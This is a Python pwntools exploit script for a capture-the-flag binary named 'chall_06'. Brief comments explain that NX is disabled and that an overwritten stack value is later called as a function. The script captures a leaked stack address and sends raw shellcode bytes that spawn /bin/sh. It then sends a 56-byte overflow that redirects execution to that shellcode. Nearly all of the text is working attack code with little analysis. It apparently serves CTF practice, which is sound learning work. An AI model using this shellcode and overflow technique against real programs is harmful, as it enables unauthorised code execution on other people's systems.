'''
Flaws: No canary, NX disabled, symbols
Security: PIE enabled

NX disabled means we can get our own shellcode
'''

from pwn import *

p = process("./chall_06")
p.recvuntil(b"Letting my armor fall again: ")
leak = int(p.recvuntil(b"\n"), 16)
print(hex(leak))

'''
Payload 1: First fgets() will read our shellcode
'''
#payload1 = asm(shellcraft.sh())
payload1 = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
p.sendline(payload1)

'''
fgets() receives at RBP - 40h
We try to override the content of RBP - 8h which passes to RDX

RDX is later on used to be called as a function
Payload 2: set the address of the memory leak where the shellcode is located
'''
offset = 56
payload2 = b"A"*offset + p64(leak)

p.sendline(payload2)
p.interactive()